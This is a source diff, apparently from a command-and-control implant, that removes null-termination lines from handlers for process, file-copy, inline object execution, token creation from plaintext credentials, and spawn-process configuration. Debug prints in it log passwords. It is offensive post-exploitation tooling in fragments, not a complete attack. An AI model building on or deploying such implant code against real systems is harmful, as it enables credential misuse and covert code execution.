@@ -449,13 +449,9 @@ VOID CommandProc( PPARSER Parser )
 
             if ( ProcessSize == 0 )
                 Process = NULL;
-            else
-                Process[ ProcessSize ] = 0;
 
             if ( ProcessArgsSize == 0 )
                 ProcessArgs = NULL;
-            else
-                ProcessArgs[ ProcessArgsSize ] = 0;
 
             PRINTF( "Process State   : %d\n", ProcessState );
             PRINTF( "Process         : %s [%d]\n", Process, ProcessSize );
@@ -969,9 +965,6 @@ VOID CommandFS( PPARSER Parser )
             PathFrom = ParserGetBytes( Parser, &FromSize );
             PathTo   = ParserGetBytes( Parser, &ToSize );
 
-            PathFrom[ FromSize ] = 0;
-            PathTo[ ToSize ]     = 0;
-
             PRINTF( "Copy file %s to %s\n", PathFrom, PathTo )
 
             Success = Instance.Win32.CopyFileW( PathFrom, PathTo, FALSE );
@@ -1051,11 +1044,6 @@ VOID CommandInlineExecute( PPARSER Parser )
     PCHAR ObjectData       = ParserGetBytes( Parser, &ObjectDataSize );
     PCHAR ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
     INT32 Flags            = ParserGetInt32( Parser );
-
-    // why? don't know anymore but I don't wanna touch it for now
-    StringCopyA( FunctionName, FunctionName );
-
-    FunctionName[ FunctionNameSize ] = 0;
 
     switch ( Flags )
     {
@@ -1382,10 +1370,6 @@ VOID CommandToken( PPARSER Parser )
 
             if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
             {
-                lpUser[ dwUserSize ]         = 0;
-                lpPassword[ dwPasswordSize ] = 0;
-                lpDomain[ dwDomainSize ]     = 0;
-
                 PRINTF( "Create new token: Domain:[%s] User:[%s] Password:[%s]\n", lpDomain, lpUser, lpPassword )
 
                 hToken = TokenMake( lpUser, lpPassword, lpDomain );
@@ -1718,9 +1702,6 @@ VOID CommandConfig( PPARSER Parser )
             UINT32  Offset     = ParserGetInt32( Parser );
             PVOID   ThreadAddr = NULL;
 
-            Library[ LibSize ] = 0;
-            Function[ FuncSize ] = 0;
-
             PRINTF( "Library  => %s\n", Library );
             PRINTF( "Function => %s\n", Function );
             PRINTF( "Offset => %x\n", Offset );
@@ -1810,9 +1791,6 @@ VOID CommandConfig( PPARSER Parser )
             UINT32  Offset     = ParserGetInt32( Parser );
             PVOID   ThreadAddr = NULL;
 
-            Library[ LibSize ] = 0;
-            Function[ FuncSize ] = 0;
-
             PRINTF( "Library  => %s\n", Library );
             PRINTF( "Function => %s\n", Function );
             PRINTF( "Offset => %x\n", Offset );
@@ -1860,7 +1838,6 @@ VOID CommandConfig( PPARSER Parser )
             Buffer = ParserGetBytes( Parser, &Size );
             Instance.Config.Process.Spawn64 = Instance.Win32.LocalAlloc( LPTR, Size );
             MemCopy( Instance.Config.Process.Spawn64, Buffer, Size );
-            Instance.Config.Process.Spawn64[ Size ] = 0;
 
             PRINTF( "Instance.Config.Process.Spawn64 => %s\n", Instance.Config.Process.Spawn64 );
             PackageAddBytes( Package, Instance.Config.Process.Spawn64, Size );
@@ -1883,7 +1860,6 @@ VOID CommandConfig( PPARSER Parser )
             Buffer = ParserGetBytes( Parser, &Size );
             Instance.Config.Process.Spawn86 = Instance.Win32.LocalAlloc( LPTR, Size );
             MemCopy( Instance.Config.Process.Spawn86, Buffer, Size );
-            Instance.Config.Process.Spawn86[ Size ] = 0;
 
             PRINTF( "Instance.Config.Process.Spawn86 => %s\n", Instance.Config.Process.Spawn86 );
             PackageAddBytes( Package, Instance.Config.Process.Spawn86, Size );
